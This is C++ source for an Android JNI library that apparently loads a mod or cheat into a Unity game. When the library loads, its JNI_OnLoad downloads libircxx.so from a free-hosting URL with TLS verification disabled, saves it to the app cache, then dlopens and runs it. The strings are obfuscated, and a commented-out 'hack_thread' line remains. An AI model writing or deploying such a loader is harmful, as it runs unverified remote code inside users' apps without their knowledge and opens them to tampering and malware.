#include "pch.h"
#include "load/load.h"
#include "unload/unload.h"
#include "Misc/Utils.h"
#include <curl/curl.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <string>
#include "JSON/JSON.h"
#include <sys/system_properties.h>
#include <Misc/zip_file.hpp>

static JNINativeMethod methods[] = {
    {OBFUSCATE("load"),    OBFUSCATE("(Ljava/lang/String;)Z"),  reinterpret_cast<void*>(load)},
    {OBFUSCATE("unload"),  OBFUSCATE("()Z"),                    reinterpret_cast<void*>(unload)},
};

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written;
    written = fwrite(ptr, size, nmemb, stream);
    return written;
}

void DownloadFileFromServer(char* URL, std::string FileName, std::string Path ) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    std::string AbsoultePath = Path + (std::string)OBFUSCATE("/") + FileName;

    curl_version_info_data *vinfo = curl_version_info(CURLVERSION_NOW);

    if (vinfo->features & CURL_VERSION_SSL) {
        //printf("CURL: SSL enabled\n");
    } else {
        //printf("CURL: SSL not enabled\n");
    }

    curl = curl_easy_init();
    if (curl) {
        fp = fopen(AbsoultePath.c_str(), OBFUSCATE("wb"));

        /* Setup the https:// verification options. Note we   */
        /* do this on all requests as there may be a redirect */
        /* from http to https and we still want to verify     */
        curl_easy_setopt(curl, CURLOPT_URL, URL);
        curl_easy_setopt(curl, CURLOPT_CAINFO, "./ca-bundle.crt");
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);

        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);

        fclose(fp);
    }
}
int (*OnLoad)(JavaVM * vm, int);
void *IrcxxHandle = nullptr;

extern "C"
JNIEXPORT jint JNICALL
JNI_OnLoad(JavaVM * vm, void* reserved) {
    JNIEnv* _env;
    jclass NativeLoadercls;

    vm->AttachCurrentThread(& _env, 0);

    NativeLoadercls = _env->FindClass(OBFUSCATE("com/unity3d/player/NativeLoader"));
    if (_env->RegisterNatives(NativeLoadercls, methods, sizeof(methods) / sizeof(methods[0])) > JNI_ERR) {
        DownloadFileFromServer(OBFUSCATE("https://blyts.000webhostapp.com/FWD/libircxx.so"), (std::string)OBFUSCATE("libircxx.so"),
                               getCacheDir(_env));

        std::string towrite = getCacheDir(_env) +  (std::string)OBFUSCATE("/libircxx.so");

        //LOGI("dadadad %s",towrite.c_str());

        IrcxxHandle = dlopen(towrite.c_str(), 1);
        OnLoad = (int (*)(JavaVM *, int))dlsym(IrcxxHandle, OBFUSCATE("JNI_OnLoad"));
        OnLoad(vm, 0);
        /*FILE* file = fopen(towrite.c_str(), "w");
        if (file != nullptr) {
            const char* data = "Hello, world!";
            fwrite(data, sizeof(char), strlen(data), file);
            fclose(file);
        }*/
        //pthread_create(&ptid, NULL, hack_thread, NULL);
        return JNI_VERSION_1_6;
    }
    _env->FatalError(OBFUSCATE("com/unity3d/player/NativeLoader"));
    return JNI_ERR;
}